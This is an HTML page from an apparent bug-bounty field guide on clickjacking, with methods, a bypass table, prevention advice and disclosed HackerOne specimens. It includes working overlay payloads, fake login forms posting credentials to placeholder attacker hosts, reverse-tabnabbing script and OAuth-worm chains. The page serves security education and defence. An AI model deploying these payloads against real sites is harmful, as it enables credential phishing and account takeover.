@@ -1,0 +1,415 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Clickjacking · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>Clickjacking</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="on" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-high)"></span>Vulnerabilities</div>
+      <h1>Clickjacking</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>20</b></span><a class="chip lab" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>Clickjacking</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>Clickjacking (UI redress) coerces a victim into clicking or typing on a control they <strong>can't see</strong>. The attacker frames a real, authenticated page and floats bait over it, so a "Click to win" click actually lands on <strong>Authorize / Purchase / Delete / Follow</strong> inside the victim's own session — the browser sends the victim's cookies, so no CSRF token is needed. The single most important rule: it is only worth reporting when the framed action <strong>changes state or leaks data</strong>; a missing header on a read-only page is a nag, not a finding.</p>
+<p>The class is broader than a hidden <code>&lt;iframe&gt;</code>. It spans <strong>transparent overlays</strong>, <strong>data-exfil clickjacks</strong> (the app auto-prefills the victim's PII, so a blind click submits it), <strong>in-app phishing forms</strong> injected into unsanitized render surfaces, framing-free <strong>DoubleClickjacking</strong> via popup timing, and <strong>reverse tabnabbing</strong>. Its real power is as a <em>delivery vector</em>: it turns otherwise-unreachable bugs (self-XSS, one-click OAuth consent) into cross-user attacks.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Enumerate one-click state-changers.</strong> Walk the app for pages where a single click authorizes, buys, deletes, deactivates, follows, or submits stored PII. Those are the only targets worth framing.</li><li><strong>Test framing in Chrome specifically.</strong> Drop the action URL into a bare iframe and load it. Some defenses (<code>ALLOW-FROM</code>) <em>appear</em> to protect in Firefox but are ignored elsewhere.</li><li><strong>Read the header value, not just its presence.</strong> <code>X-Frame-Options: ALLOW-FROM</code> = zero protection in Chrome/Safari/Edge (only Firefox and legacy IE ever honored it); <code>SAMEORIGIN</code> = beatable if the app offers a same-origin embed one level down; <strong>no</strong> <code>frame-ancestors</code> at all = frameable.</li><li><strong>Handle frame-busters.</strong> If the frame renders then the top window navigates away, the page has a JS frame-buster — neutralise it with <code>sandbox</code> (see Bypasses).</li><li><strong>Overlay bait over the real control</strong>, set the frame to <code>opacity:0</code>, and confirm the victim's click reaches the button underneath.</li><li><strong>Escalate the click</strong> — pick a target whose one click yields tokens, money, PII, or drives a second bug.</li></ol>
+<div class="pre" data-lang="html">&lt;!-- If this shows the real UI instead of a blank/refused frame, it's frameable --&gt;
+&lt;iframe src="https://TARGET/settings/oauth/authorize?client_id=x" width="900" height="700"&gt;&lt;/iframe&gt;</div>
+<h2 class="sec" id="technique-variants"><span class="tick">§</span>Technique variants</h2>
+<p>Pick the variant that matches the target's defense and impact surface.</p>
+<h3 class="sub" id="transparent-overlay-clickjack">Transparent-overlay clickjack</h3>
+<p>The classic. Frame the action page, float a decoy where the real button will render, make the frame invisible and put it on top. The victim aims at the decoy; the click lands on the framed control.</p>
+<div class="pre" data-lang="html">&lt;button style="position:absolute;z-index:1;top:300px;left:300px"&gt;Click to win!&lt;/button&gt;
+&lt;iframe src="https://TARGET/checkout/deal/DEALID?return_url=/"
+        style="opacity:0;position:absolute;z-index:2;top:0;left:0;width:100%;height:100%"&gt;&lt;/iframe&gt;</div>
+<h3 class="sub" id="data-exfil-clickjack-autofill">Data-exfil clickjack (autofill)</h3>
+<p>No keystroke hijack needed when the app <strong>auto-prefills</strong> the victim's name/email into a framed widget (persisted across tabs/merchants). The stolen blind click submits their prefilled PII to an attacker-configured endpoint.</p>
+<div class="pre" data-lang="html">&lt;!-- victim who previously used the widget has fields pre-filled; one click ships them --&gt;
+&lt;button style="position:absolute;z-index:1;top:200px;left:200px"&gt;Continue&lt;/button&gt;
+&lt;iframe src="https://commerce.widget.TARGET/checkout?to=ATTACKER_MERCHANT"
+        style="opacity:0;position:absolute;z-index:2;top:0;left:0;width:100%;height:100%"&gt;&lt;/iframe&gt;</div>
+<h3 class="sub" id="in-app-phishing-forms-iframes-no-js">In-app phishing forms/iframes (no JS)</h3>
+<p>When the "frame" is the app's own trusted chrome — a wiki, note, comment, or Electron preview pane that renders user HTML/markdown without sanitizing — inject a full <code>&lt;form&gt;</code> or an <code>&lt;iframe&gt;</code> to an attacker login page. Reuse the app's own CSS classes for a pixel-perfect fake modal, and hide the markup in HTML comments so it's invisible in the editor but rendered in preview.</p>
+<div class="pre" data-lang="html">&lt;!-- reuse the app's real classes; no inline style so a CSP can't block it --&gt;
+&lt;div class="modal show d-block"&gt;&lt;div class="modal-content"&gt;
+  &lt;h3 class="page-title"&gt;Please Log In&lt;/h3&gt;
+  &lt;form action="https://COLLAB/login.php"&gt;
+    &lt;input name="username" class="form-control"&gt;
+    &lt;input name="password" type="password" class="form-control"&gt;
+    &lt;button class="btn btn-success"&gt;Login&lt;/button&gt;
+  &lt;/form&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;!-- iframe variant slips a form-only injection filter --&gt;
+&lt;iframe src="https://COLLAB/fake-login.html" frameborder="0"&gt;&lt;/iframe&gt;</div>
+<h3 class="sub" id="full-page-click-catcher">Full-page click-catcher</h3>
+<p>Instead of overlaying a remote page, smuggle a single giant absolutely-positioned anchor into a page others view. It covers the viewport and intercepts every click, sending the victim to an attacker page (chains cleanly with reverse tabnabbing via <code>target=_blank</code>).</p>
+<div class="pre" data-lang="html">&lt;a href="https://COLLAB/signin" target="_blank"
+   class="atwho-view select2-drop-mask"&gt;&lt;img height="10000" width="10000"&gt;&lt;/a&gt;</div>
+<h3 class="sub" id="doubleclickjacking-no-iframe">DoubleClickjacking (no iframe)</h3>
+<p>Framing-free. Open a popup with a "Double Click" button positioned over where the real Authorize button will render. The victim's <strong>first</strong> click closes the decoy and drives the current tab to the real OAuth authorize URL; the <strong>second</strong> click lands on Authorize underneath. All anti-framing headers are irrelevant because nothing is framed.</p>
+<div class="pre" data-lang="">https://TARGET/oauth/authorize?client_id=ATTACKER_ID&amp;response_type=code&amp;redirect_uri=https://COLLAB/UUID&amp;scope=read_orgs,write_orgs</div>
+<h3 class="sub" id="reverse-tabnabbing">Reverse tabnabbing</h3>
+<p>Any link rendered with <code>target=_blank</code> but <strong>without</strong> <code>rel="noopener noreferrer"</code> lets the opened page rewrite the <em>original</em> tab via <code>window.opener.location</code> — repointing it to a phishing clone the victim trusts because "it was already open".</p>
+<div class="callout note"><span class="ico">● NOTE</span><div>Modern browsers (Chrome/Firefox/Safari since ~2021) make <code>target=_blank</code> <strong>imply</strong> <code>noopener</code> by default, so <code>window.opener</code> is <code>null</code> on plain anchors. Reverse tabnabbing is now exploitable mainly where the app <strong>explicitly</strong> re-adds <code>rel="opener"</code>, strips <code>noopener</code> through a flawed internal-link check (see #212629), or renders links through <code>window.open()</code>/older engines. Confirm <code>window.opener</code> is reachable before relying on it.</div></div>
+<div class="pre" data-lang="html">&lt;a href="https://COLLAB/tabnab" target="_blank"&gt;Reverse Tabnabbing&lt;/a&gt;</div>
+<div class="pre" data-lang="js">// attacker page, runs on load:
+window.opener.location = 'https://COLLAB/fake-login';</div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>A missing <code>X-Frame-Options</code> on a page with <strong>no</strong> state-changing action or PII disclosure is not a finding — it closes as informative. Always demonstrate the click landing on a real Authorize/Purchase/Delete/submit control (#391385, #154963 show what "real" impact looks like).</div></div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td><code>X-Frame-Options: ALLOW-FROM</code></td><td>Unsupported in Chrome/Safari/Edge → header ignored, page fully frameable (only Firefox/legacy IE honored it; test in Chrome)</td><td>#198622</td></tr><tr><td><code>X-Frame-Options: SAMEORIGIN</code></td><td>Nest through a same-origin embed/card: <code>TARGET→attacker→TARGET</code>; XFO only checks top-vs-frame, not the ancestor chain</td><td>#85624</td></tr><tr><td>JS frame-buster</td><td>Wrap the victim frame in <code>sandbox="allow-forms"</code> (omit <code>allow-scripts</code>/<code>allow-top-navigation</code>) to strip the buster's JS</td><td>#85624, #54733</td></tr><tr><td><code>onbeforeunload</code> top-nav buster</td><td><code>window.onbeforeunload</code> handler that calls <code>stop()</code> cancels the buster's navigation</td><td>#198622</td></tr><tr><td><code>confirm()</code> guard on the action</td><td>HTML5 <code>sandbox="allow-forms"</code> disables the JS <code>confirm()</code> dialog, so the guard never fires</td><td>#54733</td></tr><tr><td><code>frame-ancestors</code>/XFO present</td><td>Framing-free <strong>DoubleClickjacking</strong> — popup + click timing, no frame at all</td><td>#3287060</td></tr><tr><td>Markup sanitizer (attribute strip)</td><td>Smuggle <code>class</code>/<code>target</code>/<code>href</code> through an alternate markup path (RDoc linkable-image <code>{&lt;img&gt;}[link]</code>) the attribute filter doesn't cover</td><td>#662287</td></tr><tr><td>HTML sanitizer blocklist</td><td><code>&lt;frameset&gt;</code>/<code>&lt;frame&gt;</code> slip a blocklist that only filters <code>&lt;iframe&gt;</code></td><td>#285609</td></tr><tr><td>Internal-link <code>noopener</code> allowlist</td><td><code>https://TRUSTED_HOST@attacker.tld</code> — trusted host is only the userinfo, so the external host is treated "internal" and <code>rel=noopener/noreferrer</code> is dropped</td><td>#212629</td></tr><tr><td>Form-only injection filter</td><td>Inject an <code>&lt;iframe&gt;</code> to an external login page instead of a raw <code>&lt;form&gt;</code></td><td>#289823</td></tr><tr><td>Editor-visible detection</td><td>Hide the phishing markup in HTML comments — visible while editing, rendered in preview</td><td>#289823, #662287</td></tr></tbody></table></div>
+<div class="callout note"><span class="ico">● NOTE</span><div><code>sandbox</code> is the master key against frame-busters: it can disable JavaScript in the framed page (killing the buster and any <code>confirm()</code> guard) while <code>allow-forms</code> keeps the target button clickable. Never grant <code>allow-top-navigation</code> — that would hand the buster its escape.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>Clickjacking's ceiling is the action you land on — chain it into a bug that a triager pays for:</p>
+<ul><li><strong>Clickjack → OAuth authorize → token → ATO.</strong> One coerced click on a consent page grants an attacker app read/write scopes (#65825, #3287060; worm-chained in #643274).</li><li><strong>Nested-frame clickjack → one-click Follow/Tweet → self-propagating worm.</strong> A clickjacked share/follow that re-posts the same trap spreads on its own (#85624).</li><li><strong>Clickjack as the bridge for self-XSS.</strong> A self-only DOM XSS (victim must paste into a field reaching <code>$(...).html()</code>) becomes real cross-user XSS because the page is frameable and the victim can be driven through the paste/submit (#953579). See the XSS page.</li><li><strong>Clickjack a state-changing GET → CSRF-token bypass.</strong> No token is needed if the action is a GET (#305128). See the CSRF page.</li><li><strong>Data-exfil.</strong> Cross-tab field prepopulation + a 0-opacity frame leaks the victim's stored name/email on one blind click (#316290, #154963).</li><li><strong>MitM + clickjacked AV cert-override → SSL interception</strong> of high-profile HTTPS sites when security software renders frameable warning pages in the DOM (#463695).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong><code>Content-Security-Policy: frame-ancestors 'none'</code></strong> (or an explicit allowlist) is the only robust anti-framing defense — it validates the <em>whole</em> ancestor chain, which <code>SAMEORIGIN</code> does not and <code>ALLOW-FROM</code> fails to do at all. Pair with <code>X-Frame-Options: DENY</code> for legacy browsers.</li><li><strong>Never rely on JS frame-busters</strong> — <code>sandbox</code> neutralises them.</li><li><strong>Gate critical single-click actions</strong> (OAuth authorize, purchase, cert-override, delete) behind a fresh, un-coercible gesture, or keep the button disabled until real pointer/keyboard interaction — this is what stops DoubleClickjacking.</li><li><strong>Add <code>rel="noopener noreferrer"</code></strong> to every <code>target=_blank</code>, and classify "internal" links with a real URL parser (not host-prefix matching) so <code>TRUSTED@evil.tld</code> isn't misread as internal.</li><li><strong>Sanitize on render across <em>every</em> markup path</strong>, and lock Electron/preview panes with CSP <code>frame-src</code>/<code>form-action</code>.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Suite Clickbandit</strong> — automated multi-click PoC generation and postMessage frame alignment (#244697).</li><li><strong><code>quickjack</code></strong>-style auto-align scripts — position the frame precisely over a target control (#198622).</li><li><strong>Browser DevTools</strong> — confirm framing, opacity overlays, and <code>window.opener</code> reachability.</li><li><strong>A plain Chrome tab</strong> — the authoritative "is it frameable?" oracle; never trust Firefox for this.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>20</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-662287" style="--sv:var(--sev-high)" data-sev="3" data-votes="282" data-bounty="3500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Markup sanitizer bypass via RDoc image-link → full-page overlay &amp; fake login modal</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#662287</b> · gitlab · 3500 · 282 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span><span>Chain <b>HTML/attribute injection → UI redress (full-page overlay + r</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An HTML sanitizer that strips attributes in the normal path fails to sanitize anchor/img attributes emitted through an alternate markup construct (RDoc linkable image {&lt;img&gt;}[link]), letting an attacker set class/target and inject arbitrary styled markup into a page other users view.</p>
+<h4>Method</h4><ol><li>Create a wiki page and choose RDoc markup</li><li>Use the linkable-image form {&lt;a ... class=...&gt;&lt;img ...&gt;&lt;/a&gt;}[a] to smuggle attributes the normal sanitizer would strip</li><li>Apply existing app CSS classes (position:absolute + high z-index) to make an anchor cover the whole page and intercept every click</li><li>Alternatively inject a full &lt;form&gt; modal styled with the app's own CSS to render a convincing fake login prompt that POSTs to attacker.com</li><li>Publish and wait for a victim to view/click</li></ol>
+<div class="pre">{
+&lt;a href='https://attacker.tld/users/signin' class='atwho-view select2-drop-mask pika-select'&gt;
+&lt;img height=10000 width=10000&gt;&lt;/a&gt;
+}[a]
+
+&lt;!-- fake login modal reusing the app's own bootstrap classes --&gt;
+{
+&lt;div class="modal show d-block"&gt;&lt;div class="modal-dialog"&gt;&lt;div class="modal-content"&gt;
+&lt;div class="modal-header"&gt;&lt;h3 class="page-title"&gt;Please Log In&lt;/h3&gt;&lt;/div&gt;
+&lt;div class="modal-body"&gt;&lt;form action="http://attacker.tld/"&gt;
+&lt;input type="text" name="username" class="form-control"&gt;
+&lt;input type="password" name="password" class="form-control"&gt;
+&lt;button type="submit" class="btn btn-success"&gt;Login&lt;/button&gt;
+&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
+}[/]</div>
+<p class="insight"><b>Insight —</b> When a sanitizer has multiple parsing paths (markdown vs RDoc vs Textile etc.), test EVERY alternate markup construct — the same attribute filter is often only wired into the primary path. Reusing the target app's own CSS class names produces pixel-perfect fake dialogs and full-page click-catchers without needing inline styles that CSP might block.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/662287" target="_blank" rel="noopener">hackerone.com/reports/662287</a></span><a class="src" href="#report-662287" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-643274" style="--sv:var(--sev-high)" data-sev="3" data-votes="64" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>DM link-truncation spoof chained to clickjacked OAuth-app worm</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#643274</b> · x · awarded · 64 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>Trusted-DM delivery → truncation link spoof → fake Google re</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A DM UI truncates displayed link text after ~38 chars, so a long URL renders as a trusted-looking prefix (accounts.youtube.com/accounts/SetSI...) while actually pointing elsewhere; combined with a fake Google re-login and a clickjacked/auto-authorized malicious OAuth app, one click seeds a self-spreading worm via the victim's DMs.</p>
+<h4>Method</h4><ol><li>Craft a very long URL whose visible truncated prefix is a trusted domain path (e.g. accounts.youtube.com/accounts/SetSID?...)</li><li>Deliver it via DM from an already-infected reciprocal follow so it carries social trust</li><li>Chain: force Google logout then a fake Google re-login harvests credentials</li><li>Redirect through attacker infra to a randomized malicious 3rd-party Twitter OAuth app authorize screen (one of ~10 to evade blocking)</li><li>If the victim is logged in, the authorize click can be completed automatically; the app then DMs the same link to all the victim's reciprocal follows</li></ol>
+<div class="pre">Displayed:  ONLY FOR YOU { accounts.youtube.com/accounts/SetSI... }
+Actual:     https://accounts.youtube.com/accounts/SetSID?...&amp;continue=https%3A%2F%2Fgoogle.com%2Faccounts%2FLogout%3Fcontinue%3D...%2Fwww.getmorefollowers.biz%2F...
+
+OAuth sink (randomized to evade takedown):
+https://api.twitter.com/oauth/authenticate?oauth_token=&lt;attacker_app_token&gt;</div>
+<p class="insight"><b>Insight —</b> UI text truncation of links is a spoofing primitive: whatever renders in the first N chars is the whole social-engineering payload. Combine link-display spoofing with an OAuth 'authorize app' one-click action to build a self-propagating worm — rotate many attacker app tokens so blocklists lag. Look for any place a client shortens/truncates displayed URLs.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/643274" target="_blank" rel="noopener">hackerone.com/reports/643274</a></span><a class="src" href="#report-643274" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-85624" style="--sv:var(--sev-med)" data-sev="2" data-votes="134" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Wormable clickjacking via nested-frame XFO bypass + sandbox anti-framebuster</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#85624</b> · x · awarded · 134 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>Same-origin embed → nested-frame XFO bypass → sandbox anti-f</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">X-Frame-Options: SAMEORIGIN only checks the immediate top window's origin, so a same-origin embeddable feature (Twitter Player Card) can re-frame a sensitive same-origin page through an attacker frame (twitter→attacker→twitter), defeating SAMEORIGIN; CSP2 frame-ancestors is the only correct defense but is unsupported in older Safari/IE.</p>
+<h4>Method</h4><ol><li>Find an app feature that renders attacker-controlled HTML inside a same-origin iframe (player card, embed, preview)</li><li>From that inner frame, embed the sensitive same-origin page: twitter.com(top) → attacker card → twitter.com(action page)</li><li>SAMEORIGIN passes because it only compares top-vs-frame origin, not the full ancestor chain</li><li>Wrap the victim frame with iframe sandbox to strip JS and kill any JS frame-buster</li><li>Overlay bait UI over one-click actions (follow/retweet/tweet) to make the attack self-propagating (wormable)</li></ol>
+<div class="pre">&lt;!-- attacker-controlled player-card HTML re-frames a same-origin action page --&gt;
+&lt;iframe src="//twitter.com/some/one-click-action"&gt;&lt;/iframe&gt;
+
+&lt;!-- defeat any JS frame-buster on the framed page --&gt;
+&lt;iframe sandbox="allow-forms allow-scripts" src="//victim.tld/action"&gt;&lt;/iframe&gt;</div>
+<p class="insight"><b>Insight —</b> XFO SAMEORIGIN is bypassable whenever the app itself lets you frame same-origin content one level down (embeds/cards/previews) — only CSP frame-ancestors validates the whole ancestor list. Always add sandbox (without allow-top-navigation) to neutralize JS frame-busters. A clickjack over a one-click 'share/tweet' action becomes a self-spreading worm.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/85624" target="_blank" rel="noopener">hackerone.com/reports/85624</a></span><a class="src" href="#report-85624" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3287060" style="--sv:var(--sev-med)" data-sev="2" data-votes="57" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>DoubleClickjacking on OAuth consent (defeats X-Frame-Options)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3287060</b> · wakatime · none · 57 votes · resolved</div>
